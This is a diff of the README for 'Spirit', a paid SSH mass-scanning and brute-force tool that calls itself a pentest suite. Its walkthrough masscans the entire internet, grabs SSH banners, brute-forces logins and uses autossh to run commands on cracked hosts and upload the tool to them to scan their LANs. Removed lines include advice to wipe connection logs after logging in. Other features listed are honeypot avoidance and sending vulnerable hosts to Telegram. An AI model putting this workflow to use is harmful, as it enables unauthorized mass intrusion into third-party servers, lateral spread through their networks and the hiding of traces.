@@ -1,85 +1,62 @@
 # Spirit - Network Pentest Tools
-> We believe in making the internet a safe environment where security is taken seriously as a priority and forcing out of the market bad actors like the admins allowing password authentication over such a critical cog of our infrastructure. Spirit is designed to root out these weeds (pun intended).
+
+Spirit is a suite of high-performance tools for authorized network penetration testing and SSH security auditing. It is designed for experienced security professionals who need fast, reliable mass scanning, banner grabbing, and credential testing capabilities.
+
 <p align="left">  <a href="https://t.me/spiritNPT"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a></p>
 
 ### Install (recommended)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/install.sh | sh
+$ curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/install.sh | sh
 ```
 
 This installs `./spirit` into your current directory with checksum verification.
 
 ### Quick Start with go.sh
 
-For the classic "scan a list of networks → grab banners → brute-force" workflow, use the lightweight wrapper:
+The recommended path for targeted zone scanning:
 
 ```bash
-# Fetch the wrapper
-curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/go.sh -o go.sh
-chmod +x go.sh
+$ curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/go.sh -o go.sh
+$ chmod +x go.sh
 
-# Create a zone.lst with CIDR ranges, one per line
-cat > zone.lst << 'EOF'
+$ cat > zone.lst << 'EOF'
 192.168.0.0/16
 10.0.0.0/8
 EOF
 
-# Run the full pipeline (masscan + parse + banner + brute)
-sudo ./go.sh --zone zone.lst --ports 22,23,2222 --rate 30000
+$ sudo ./go.sh --zone zone.lst --ports 22,23,2222 --rate 30000
 ```
 
-- The script auto-downloads `./spirit` (with checksum verification) if it's missing.
-- It also installs `masscan` automatically on common Linux distributions.
-- Previous scan artifacts are backed up into `./bak/` with timestamps before every run.
-- Colors are shown only when connected to a terminal.
-- Run `./go.sh --help` for all options.
+**Notes**
+- Automatically installs `./spirit` (with checksums) and `masscan` when missing.
+- Previous run artifacts are timestamped and moved to `./bak/`.
+- Use `./go.sh --help` for options.
 
-For continuous random scanning, see the [Autobrute with zones](#autobrute-with-zones) section below.
+### Choosing your workflow
 
-### Manual download (alternative)
+- **go.sh** (recommended) — One-shot targeted scanning of specific networks/zones with full parse → banner → brute pipeline. Ideal for focused assessments.
+- **spirit autobrute** (legacy) — Continuous, random, collision-free scanning forever. See the [Legacy Tools](#legacy-tools) section further below.
+
+### Manual download (legacy)
+
+For air-gapped or special environments, you can still download the pre-built binary directly:
 
 ```bash
-$ wget https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
 $ curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
-
 $ tar xvf spirit.tgz
-$ ./spirit autobrute --ports 22
+$ ./spirit --help
 ```
-
-> [`$ ./spirit --help`](./HELP) shows you all the included tools. \
-Most commands have subcommands `./spirit <command> --help`
-
-## Autobrute with zones
-```bash
-# Create zone.lst containing IP addresses in CIDR notation
-$ cat >zone.lst<< EOF
-192.168.0.0/16
-172.16.0.0/12
-10.0.0.0/8
-EOF
-
-# autobrute will generate collision-free(non-repeating) random ports
-# scan and brute them over and over -- forever!
-./spirit autobrute
-```
-
-## Local network demo
-[![asciicast](https://asciinema.org/a/645079.svg)](https://asciinema.org/a/645079?autoplay=true&loop=true)
-
-## Support
-- [GitHub Issue](https://github.com/theaog/spirit/issues/new)
-- [Telegram](https://t.me/spiritNPT)
 
 ## Upgrade Spirit automatically
 ```bash
-./spirit upgrade
+$ ./spirit upgrade
 Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
 ```
 
 ## Spirit Brute|Banner vs Other...
 
-### Spirit Banner 
+### Spirit Banner
 - Stealthy, sends the least amount of TCP packets in order to retrieve the SSH version then breaks the connections without doing a Login
 - Proper connection handling and timeout, doesn't leave dead connections open wasting file descriptors
 - Fast, very fast and accurate
@@ -97,14 +74,42 @@ Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
 - Allows submitting vulnerable hosts to your telegram channel
 - Encrypts your passfile to safely use it on unsecured systems
 - Excludes vuln found hosts, nologin hosts and honeypots from future scans: narrowing your search
-- Generates statiscs and error logs
+- Generates statistics and error logs
+
+## Legacy Tools
+
+These older workflows are preserved for users who prefer manual control or have specific environment constraints.
+
+### Manual binary download
+
+```bash
+$ curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
+$ tar xvf spirit.tgz
+$ ./spirit --help
+```
+
+### Autobrute (continuous random scanning)
+
+```bash
+$ cat > zone.lst << 'EOF'
+192.168.0.0/16
+10.0.0.0/8
+EOF
+
+$ ./spirit autobrute
+```
+
+### Local network demo (autobrute)
+
+[![asciicast](https://asciinema.org/a/645079.svg)](https://asciinema.org/a/645079?autoplay=true&loop=true)
+
+> **Note:** For most targeted work, prefer `./go.sh` (see Quick Start above).
 
 ## Example usage for SSH brute flow TLDR;
 
-> **Tip:** Most users should use the one-command wrapper instead: see [Quick Start with go.sh](#quick-start-with-gosh) above.
+> For most targeted assessments, use the `./go.sh` wrapper (see Quick Start above) instead of running the individual commands manually.
 
 ```bash
-# First scan your network or the internet (check disclaimer) to acquire a list of open ports.
 $ masscan \
     --rate="50000" \
     --ports "22,222,2222,2212" 0.0.0.0/0 \
@@ -113,59 +118,38 @@ $ masscan \
 Scanning 4294967295 hosts [4 ports/host]
 # masscan will create an open.lst file in oG (output Greppable) format.
 
-# Parse this open.lst to format the data, so that spirit can understand it.
 $ ./spirit parse
 INFO created h.lst in HOST:PORT format
 
-# Optional: create a filter.lst file if you want to skip certain SSH versions.
-# You can find common filters in this repo `filter.lst` file.
-$ cat >filter.lst<< EOF
+$ cat > filter.lst << 'EOF'
 SSH-1.0
 SSH-2.0-CISCO
 SSH-2.0-Comware
 EOF
 
-# Grab SSH banners to make sure your target version is running on the host. NOTE: Makes a backup of h.lst to h.lst.bak
 $ ./spirit banner
 INFO backing up h.lst to h.lst.bak
-SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
+...
 INFO created h.lst in HOST:PORT:BANNER format
-head -n1 h.lst
-100.100.100.100:2222:SSH-2.0-OpenSSH_6.6.1
 
-# Add a password list, spirit will automatically load user:pass from a p.lst file.
-# NOTE: if p.lst is not present, Spirit uses an internal passfile
-$ cat > p.lst << EOF
+$ cat > p.lst << 'EOF'
 user1:pass1
 user1:pass2
 user2:pass50
 EOF
 
-# Start bruting...
 $ ./spirit brute
-Spirit NPT (v1.30) upgrade by 24 Mar 24 00:00 UTC
-HINT: Use `./spirit zap` to clean connection logs after you login via SSH
-rlimit soft [1048576] hard [1048576]
-INFO loaded b.lst with 26803 hosts
-INFO loaded p.lst with 4881 logins
-INFO randomized hosts
-INFO block [true]
-INFO timeout [5s]
-INFO threads [1024]
+...
 [2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
 Results
- |- found.ssh # Prepared SSH command
- |- found.login # Successful USER:PASS combinations
- |- found.lst # Syntax for autossh tool
- |- found.errors # SSH connection error statistics
-Hosts[26803] Bruted[4000] Blocked[19803] Found[3000]
+  |- found.ssh
+  |- found.login
+  |- found.lst
+  |- found.errors
 
-# If you want to go Faster try blocking bad hosts
-./spirit brute --block=true
+$ ./spirit brute --block=true
 
-# Connect to all your found hosts automatically & run commands.
 $ ./spirit autossh --command 'whoami && uptime'
-# Upload spirit to all hosts and scan the LAN
 $ ./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
 ```
 
@@ -182,13 +166,9 @@ Pricing model: $1 / Server / Day
 ┃ How many servers?> 1
 
 ┃ How many days?> 10
-
-┃ Would you like 10% off using a referral code?
-┃
-┃   Yes     No
 ```
 
-> if you encounter any issues w/ the payment, please reach out to us on [telegram](https://t.me/spiritNPT) or open an [issue](https://github.com/theaog/spirit/issues)
+> If you encounter any issues with the payment, please reach out to us on [Telegram](https://t.me/spiritNPT) or open an [issue](https://github.com/theaog/spirit/issues).
 
 # Support our development
 
@@ -201,12 +181,13 @@ Pricing model: $1 / Server / Day
 `bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`
 
 ## Get Help & Support
-Open a Github [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).
+Open a GitHub [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).
 
 Don't forget to give us a Star!
 
 > [!NOTE]
 Spirit is clean software the only data it sends home is a server hash to verify the license.
+We will never compromise our integrity.
 
 # Disclaimer
 
